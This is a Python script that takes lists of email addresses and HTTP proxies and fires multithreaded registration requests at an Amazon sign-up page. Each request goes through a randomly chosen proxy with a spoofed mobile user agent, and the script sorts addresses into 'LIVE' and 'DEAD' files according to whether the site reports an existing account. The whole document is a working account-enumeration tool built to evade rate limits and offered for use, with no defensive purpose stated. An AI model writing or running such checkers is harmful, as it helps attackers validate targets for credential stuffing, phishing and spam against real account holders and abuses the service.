#!/usr/bin/python
import requests
import threading
import random
link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
def Amazon(email):
 while True:
  try:
   s=requests.Session()
   tt='http://%s' % (random.sample(listaprx,1)[0])
   s.proxies ={'https':tt}
   s.get(link, headers=head)
   xxx = {'customerName':'Azertyaron','email': email,'emailCheck': email,'password':'HAHAHA12@3','passwordCheck':'HAHAHA12@3'}
   pk = s.post(link, headers=head, data=xxx).text
   if "You indicated you are a new customer, but an account already exists with the e-mail" in pk:
     print(email+" Proxy : "+str(tt)+" [ LIVE EMAIL ]")
     open('live.txt','a+').write(email + "\n")
   else:
     print(email+" Proxy : "+str(tt)+" [ DEAD EMAIL ]")
     open('dead.txt','a+').write(email + "\n")
  except Exception as exx:
   continue
  break
txt = input('[X] emails List : ')
filep = input('[X] Proxies List (http) : ')
Threads=input('[X] Threads Number :')
with open(filep) as fileprx:
 listaprx = fileprx.read().split('\n')
 random.shuffle(listaprx)
with open(txt) as file:
 lista = file.read().split('\n')
threadnum = int(Threads)
threads = []
for i in lista:
 thread = threading.Thread(target=Amazon,args=(i.strip(),))
 threads.append(thread)
 thread.start()